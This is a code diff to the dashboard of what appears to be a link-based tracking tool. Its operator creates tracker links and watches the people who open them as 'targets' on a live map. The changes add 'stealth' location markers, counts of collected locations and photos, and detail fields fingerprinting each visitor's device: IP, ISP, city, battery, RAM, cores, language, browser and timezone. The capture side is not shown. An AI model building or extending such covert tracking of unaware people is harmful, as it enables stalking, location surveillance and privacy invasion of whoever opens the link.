@@ -101,12 +101,19 @@ async function createTracker() {
 
 async function submitCreateTracker() {
   const name = document.getElementById('tracker-name').value.trim();
+  const btn = document.querySelector('#create-modal .btn-primary');
+  btn.disabled = true;
+  btn.textContent = 'Creating...';
   try {
     const res = await fetch('/api/tracker/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ name: name || undefined })
     });
+    if (!res.ok) {
+      const errData = await res.json().catch(() => ({}));
+      throw new Error(errData.error || `Server error (${res.status})`);
+    }
     const data = await res.json();
     if (data.success) {
       closeModal();
@@ -114,11 +121,18 @@ async function submitCreateTracker() {
       document.getElementById('generated-link').value = data.link;
       document.getElementById('link-modal').classList.remove('hidden');
       trackers.push(data.tracker);
-      socket.emit('watch-tracker', data.tracker.id);
+      if (socket) socket.emit('watch-tracker', data.tracker.id);
       renderTrackerList();
+      showToast('Tracker created!');
+    } else {
+      throw new Error(data.error || 'Unknown error');
     }
   } catch (e) {
-    showToast('Failed to create tracker', 'error');
+    showToast('Failed: ' + e.message, 'error');
+    console.error('Tracker creation error:', e);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Create';
   }
 }
 
@@ -136,17 +150,19 @@ async function deleteTracker() {
 function updateMarker(trackerId, sessionId, location) {
   const key = `${trackerId}:${sessionId}`;
   const tracker = trackers.find(t => t.id === trackerId);
-  const name = `${tracker?.name || 'Device'} (${sessionId})`;
+
+  const label = location.note === 'Network Location' ? 'Network' : (sessionId.slice(-4).toUpperCase());
 
   if (markers[key]) {
     markers[key].setLatLng([location.latitude, location.longitude]);
+    markers[key].getElement().querySelector('.marker-label').textContent = label;
   } else {
     const icon = L.divIcon({
       className: 'custom-marker',
-      html: `<div class="marker-dot active"></div>
-             <div class="marker-label">${sessionId}</div>`,
-      iconSize: [20, 20],
-      iconAnchor: [10, 10]
+      html: `<div class="marker-dot ${location.note ? 'stealth' : 'active'}"></div>
+             <div class="marker-label">${label}</div>`,
+      iconSize: [30, 30],
+      iconAnchor: [15, 15]
     });
     markers[key] = L.marker([location.latitude, location.longitude], { icon }).addTo(map);
     markers[key].on('click', () => { selectTracker(trackerId); selectSession(sessionId); });
@@ -247,14 +263,22 @@ async function updateDetailPanel(trackerId, liveData = null) {
     'detail-last-update': loc.timestamp ? formatTime(loc.timestamp) : 'Never',
     'detail-coords': loc.latitude ? `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}` : '—',
     'detail-accuracy': loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '—',
-    'detail-speed': loc.speed != null ? `${(loc.speed * 3.6).toFixed(1)} km/h` : '—',
-    'detail-model': di.deviceModel ? `${di.deviceModel}` : (di.platform || '—'),
-    'detail-battery': di.battery ? `${di.battery} (${di.charging === 'Yes' ? 'Charging' : 'Bat'})` : '—',
+    'detail-speed': loc.speed != null ? `${(loc.speed * 3.6).toFixed(1)} km/h` : '0 km/h',
+    'detail-mini-model': di.deviceModel || di.platform || 'General Device',
+    'detail-device-name': di.deviceModel || di.platform || 'Unknown Target',
+    'detail-model': di.deviceModel ? `${di.deviceModel}` : (di.platform || 'Standard Device'),
+    'detail-battery': di.battery ? `${di.battery} (${di.charging === 'Yes' ? 'Charging' : 'Battery'})` : '—',
     'detail-network': di.network ? `${di.network.toUpperCase()}` : '—',
+    'detail-browser': di.browser || '—',
     'detail-ip': di.ipAddress || '—',
     'detail-isp': di.isp || '—',
     'detail-location': di.city ? `${di.city}, ${di.country || ''}` : '—',
+    'detail-country': di.country || '—',
     'detail-screen': di.screen || '—',
+    'detail-language': di.language || '—',
+    'detail-cores': di.cores || '—',
+    'detail-ram': di.ram || '—',
+    'detail-touch': di.touch || '—',
     'detail-timezone': di.timezone || '—'
   };
 
@@ -297,6 +321,8 @@ function renderPhotos(photos) {
 function updateStats() {
   document.getElementById('stat-total').textContent = trackers.length;
   document.getElementById('stat-active').textContent = trackers.filter(t => t.active).length;
+  document.getElementById('stat-locations').textContent = trackers.reduce((sum, t) => sum + (t.locationCount || 0), 0);
+  document.getElementById('stat-photos').textContent = trackers.reduce((sum, t) => sum + (t.photoCount || 0), 0);
 }
 
 function closeModal() { document.getElementById('create-modal').classList.add('hidden'); }
